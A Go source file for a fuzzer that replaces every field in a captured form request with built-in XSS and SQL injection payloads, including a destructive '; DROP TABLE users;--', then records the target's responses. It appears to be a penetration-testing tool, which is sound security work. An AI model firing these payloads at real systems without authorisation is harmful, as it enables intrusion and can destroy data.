// fuzzer.go — XSS/SQLi payload injection fuzzer.
// Replaces every form field value in a captured request body with
// each payload from the built-in wordlist and records the responses.
package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// FuzzResult is a single payload → response pair.
type FuzzResult struct {
	Payload    string `json:"payload"`
	StatusCode int    `json:"statusCode"`
	BodySnip   string `json:"bodySnip"`
	DurationMs int64  `json:"durationMs"`
}

// FuzzReport is the full output of a fuzzing run.
type FuzzReport struct {
	TargetURL string       `json:"targetUrl"`
	Method    string       `json:"method"`
	Results   []FuzzResult `json:"results"`
}

// xssPayloads is the built-in XSS wordlist.
var xssPayloads = []string{
	`<script>alert(1)</script>`,
	`"><script>alert(1)</script>`,
	`'><img src=x onerror=alert(1)>`,
	`javascript:alert(1)`,
	`<svg onload=alert(1)>`,
	`<body onload=alert(1)>`,
	`<iframe src="javascript:alert(1)">`,
}

// sqliPayloads is the built-in SQL injection wordlist.
var sqliPayloads = []string{
	`' OR '1'='1`,
	`'; DROP TABLE users;--`,
	`' OR 1=1--`,
	`admin'--`,
	`1' ORDER BY 1--+`,
	`1 UNION SELECT null,null--`,
	`" OR ""="`,
}

// Fuzzer runs combined XSS + SQLi payload lists against a target request.
type Fuzzer struct {
	client *http.Client
	mu     sync.Mutex
}

func NewFuzzer() *Fuzzer {
	return &Fuzzer{
		client: &http.Client{
			Timeout: 10 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
}

// allPayloads returns the combined wordlist ordered XSS then SQLi.
func allPayloads() []string {
	var out []string
	out = append(out, xssPayloads...)
	out = append(out, sqliPayloads...)
	return out
}

// Run fires one request per payload by replacing all form fields with the payload.
// targetURL and rawBody are the original POST body.
func (f *Fuzzer) Run(method, targetURL, rawBody string, headers map[string]string) (*FuzzReport, error) {
	f.mu.Lock()
	defer f.mu.Unlock()

	report := &FuzzReport{
		TargetURL: targetURL,
		Method:    method,
	}

	payloads := allPayloads()
	for _, payload := range payloads {
		fuzzedBody := injectPayload(rawBody, payload)

		start := time.Now()
		req, err := http.NewRequest(method, targetURL, strings.NewReader(fuzzedBody))
		if err != nil {
			report.Results = append(report.Results, FuzzResult{
				Payload:  payload,
				BodySnip: fmt.Sprintf("request error: %v", err),
			})
			continue
		}

		// Copy supplied headers
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		if _, ok := headers["Content-Type"]; !ok {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}

		resp, err := f.client.Do(req)
		elapsed := time.Since(start).Milliseconds()
		if err != nil {
			report.Results = append(report.Results, FuzzResult{
				Payload:    payload,
				BodySnip:   fmt.Sprintf("request failed: %v", err),
				DurationMs: elapsed,
			})
			continue
		}

		body, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
		resp.Body.Close()

		report.Results = append(report.Results, FuzzResult{
			Payload:    payload,
			StatusCode: resp.StatusCode,
			BodySnip:   string(body),
			DurationMs: elapsed,
		})
	}

	return report, nil
}

// injectPayload replaces every form field value in a URL-encoded body with the payload.
func injectPayload(rawBody, payload string) string {
	vals, err := url.ParseQuery(rawBody)
	if err != nil || len(vals) == 0 {
		// If not URL-encoded, do a simple replacement of any quoted string
		return payload
	}
	for k := range vals {
		vals.Set(k, payload)
	}
	return vals.Encode()
}
